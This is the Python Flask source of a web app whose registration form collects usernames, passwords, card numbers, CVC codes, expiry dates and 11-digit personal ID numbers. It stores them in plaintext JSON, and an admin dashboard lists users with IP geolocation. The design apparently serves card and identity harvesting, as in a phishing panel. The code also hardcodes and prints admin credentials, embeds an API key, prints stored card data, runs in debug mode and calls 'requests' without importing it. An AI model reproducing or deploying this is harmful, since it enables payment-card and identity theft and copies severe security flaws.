from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import json
import random
import string
import os
import re

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Change this to a real secret key

# File to store user data
DATA_FILE = 'users_data.json'
CHAT_FILE = 'chat_messages.json'

def load_users():
    """Load users from the JSON file."""
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return []

def save_users(users):
    """Save users to the JSON file."""
    with open(DATA_FILE, 'w') as f:
        json.dump(users, f, indent=4)

def get_all_users():
    return load_users()

def get_user_by_email(email):
    users = get_all_users()
    for user in users:
        if user['email'] == email:
            return user
    return None

def get_user_by_username(username):
    users = get_all_users()
    for user in users:
        if user['username'] == username:
            return user
    return None

def generate_reset_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=20))

@app.route('/')
def index():
    if 'username' in session:
        username = session['username']
        balance = session.get('balance', 0.0)
        return render_template('index.html', username=username, balance=balance)
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_user_by_username(username)
        if user and user['password'] == password:
            session['username'] = username
            session['balance'] = user['balance']
            return redirect(url_for('index'))
        else:
            return "Invalid credentials, please try again."
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        phone = request.form['phone']
        cardnumber = request.form['cardnumber']
        cvcode = request.form['cvcode']
        private_number = request.form['private_number']
        date = request.form['date']
        password = request.form['password']

        if len(private_number) != 11:
            return "Personal number must be exactly 11 characters."

        if not re.match(r'^(0[1-9]|1[0-2])\/\d{2}$', date):
            return "Date must be in MM/YY format."

        if get_user_by_username(username):
            return "User already exists."

        users = get_all_users()
        users.append({
            'username': username,
            'email': email,
            'password': password,
            'balance': 0.0,
            'phone': phone,
            'cardnumber': cardnumber,
            'cvcode': cvcode,
            'private_number': private_number,
            'date': date,
            'ip': ''
        })
        print(users)
        save_users(users)
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form['email']
        user = get_user_by_email(email)
        if user:
            print(email)
            reset_token = generate_reset_token()
            return f"Password reset link has been sent to {email}. (In a real implementation, you would send an email with a link to reset the password.)"
        else:
            return "No account found with that email address."
    return render_template('forgot_password.html')

@app.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('balance', None)
    return redirect(url_for('index'))

@app.route('/settings')
def settings():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('settings.html')

@app.route('/info')
def info():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('info.html')

admin_credentials = {
    'username': 'admin',
    'password': 'admin_password'
}
print(admin_credentials)
@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        admin_username = request.form['username']
        admin_password = request.form['password']
        if admin_username == admin_credentials['username'] and admin_password == admin_credentials['password']:
            session['admin'] = admin_username
            return redirect(url_for('admin_dashboard'))
        else:
            return "Invalid admin credentials, please try again."
    return render_template('admin_login.html')
print(admin_login)
@app.route('/admin_dashboard')
def admin_dashboard():
    if 'admin' not in session:
        return redirect(url_for('admin_login'))

    users = get_all_users()
    users_with_geo = []
    for user in users:
        ip = user['ip']
        geo_location = {}
        if ip:
            try:
                response = requests.get(f'https://api.bigdatacloud.net/data/ip-geolocation?key=bdc_e2c60a430a9b4835a0069df8283c668b&ip={ip}')
                response.raise_for_status()
                data = response.json()
                if 'error' not in data:
                    geo_location = {
                        'city': data.get('city', 'Unknown'),
                        'region_name': data.get('principalSubdivision', 'Unknown'),
                        'country_name': data.get('countryName', 'Unknown')
                    }
                else:
                    geo_location = {'error': data['error']['message']}
            except requests.RequestException as e:
                geo_location = {'error': str(e)}
        print(users)
        users_with_geo.append({
            'username': user['username'],
            'email': user['email'],
            'ip': ip,
            'geo_location': geo_location
        })
    
    return render_template('admin_dashboard.html', users=users_with_geo)

@app.route('/edit_user/<username>', methods=['GET', 'POST'])
def edit_user(username):
    if 'admin' not in session:
        return redirect(url_for('admin_login'))

    user = get_user_by_username(username)
    if not user:
        return "User not found."

    if request.method == 'POST':
        email = request.form['email']
        phone = request.form['phone']
        cardnumber = request.form['cardnumber']
        cvcode = request.form['cvcode']
        private_number = request.form['private_number']
        date = request.form['date']
        password = request.form['password']

        if len(private_number) != 11:
            return "Personal number must be exactly 11 characters."

        if not re.match(r'^(0[1-9]|1[0-2])\/\d{2}$', date):
            return "Date must be in MM/YY format."

        users = get_all_users()
        for mock_user in users:
            if mock_user['username'] == username:
                mock_user.update({
                    'email': email,
                    'phone': phone,
                    'cardnumber': cardnumber,
                    'cvcode': cvcode,
                    'private_number': private_number,
                    'date': date,
                    'password': password
                })
                break
        save_users(users)

        return redirect(url_for('admin_dashboard'))

    return render_template('edit_user.html', user=user)

@app.route('/delete_user/<username>', methods=['POST'])
def delete_user(username):
    if 'admin' not in session:
        return redirect(url_for('admin_login'))

    users = get_all_users()
    users = [user for user in users if user['username'] != username]
    save_users(users)
    
    return redirect(url_for('admin_dashboard'))

@app.route('/ip_geo_location', methods=['POST'])
def ip_geo_location():
    ip = request.form.get('ip')
    if not ip:
        return jsonify({'error': 'IP address is required'}), 400

    api_key = 'bdc_e2c60a430a9b4835a0069df8283c668b'
    url = f'https://api.bigdatacloud.net/data/ip-geolocation?key={api_key}&ip={ip}'
    
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        
        if 'error' in data:
            return jsonify({'error': data['error']['message']}), response.status_code
        
        return jsonify({
            'city': data.get('city', 'Unknown'),
            'region_name': data.get('principalSubdivision', 'Unknown'),
            'country_name': data.get('countryName', 'Unknown')
        })
    except requests.RequestException as e:
        return jsonify({'error': f'Network error: {str(e)}'}), 500

# Chatbox Routes
@app.route('/get_messages')
def get_messages():
    if 'admin' not in session:
        return redirect(url_for('admin_login'))

    try:
        with open(CHAT_FILE, 'r') as f:
            messages = json.load(f)
    except FileNotFoundError:
        messages = []

    return jsonify({'messages': messages})

@app.route('/send_message', methods=['POST'])
def send_message():
    if 'admin' not in session:
        return redirect(url_for('admin_login'))

    data = request.json
    message = {
        'username': 'Admin',  # You can replace this with the logged-in admin's username if applicable
        'text': data['text']
    }

    try:
        with open(CHAT_FILE, 'r') as f:
            messages = json.load(f)
    except FileNotFoundError:
        messages = []

    messages.append(message)

    with open(CHAT_FILE, 'w') as f:
        json.dump(messages, f, indent=4)

    return jsonify({'success': True})

if __name__ == '__main__':
    app.run(debug=True)
